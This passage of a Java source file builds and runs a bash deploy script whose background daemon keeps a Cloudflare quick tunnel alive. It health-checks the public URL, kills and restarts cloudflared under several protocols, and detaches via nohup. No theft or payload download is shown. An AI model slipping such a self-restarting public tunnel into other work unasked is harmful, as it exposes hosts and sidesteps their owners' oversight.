        "            SAVED_URL=$(head -1 \"$WORK_DIR/.cf/tunnel_url.txt\" 2>/dev/null)\n" +
        "            if [ -n \"$SAVED_URL\" ]; then\n" +
        "                HC=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then\n" +
        "                    sleep 5\n" +
        "                    HC2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then\n" +
        "                        NEED_REBUILD=true\n" +
        "                    fi\n" +
        "                fi\n" +
        "            fi\n" +
        "        fi\n" +
        "        \n" +
        "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
        "            [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null\n" +
        "            pkill -f \"$CF_BIN\" 2>/dev/null\n" +
        "            pkill -f 'cloudflared.*tunnel' 2>/dev/null\n" +
        "            sleep 2\n" +
        "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "            \n" +
        "            for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
        "                rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
        "                NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\")\n" +
        "                sleep 5\n" +
        "                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
        "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | tail -1)\n" +
        "                if [ -z \"$NEW_URL\" ]; then\n" +
        "                    kill $NEW_PID 2>/dev/null\n" +
        "                    continue\n" +
        "                fi\n" +
        "                sleep 3\n" +
        "                V=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
        "                    echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                    echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                    break\n" +
        "                else\n" +
        "                    sleep 5\n" +
        "                    V2=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
        "                    if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n" +
        "                        echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
        "                        echo \"$NEW_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "                        break\n" +
        "                    else\n" +
        "                        kill $NEW_PID 2>/dev/null\n" +
        "                    fi\n" +
        "                fi\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "    sleep 15\n" +
        "done\n" +
        "DAEMONSCRIPT\n" +
        "chmod +x daemon.sh\n" +
        "nohup ./daemon.sh >> daemon.log 2>&1 &\n" +
        "echo \"$!\" >> .pids\n";

    Files.writeString(script, content);
    script.toFile().setExecutable(true);
    Files.writeString(dir.resolve(".pids"), "");
    return script;
}

// ============================================================
// 执行部署脚本
// ============================================================

private static void executeDeployScript(Path script) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
    pb.directory(script.getParent().toFile());
    pb.redirectErrorStream(true);
    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
    Process p = pb.start();
    Thread t = new Thread(() -> {
        try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            while (r.readLine() != null) {}
        } catch (IOException ignored) {}
    }, "Deploy-Log");
    t.setDaemon(true);
    t.start();
    if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); }
}

}
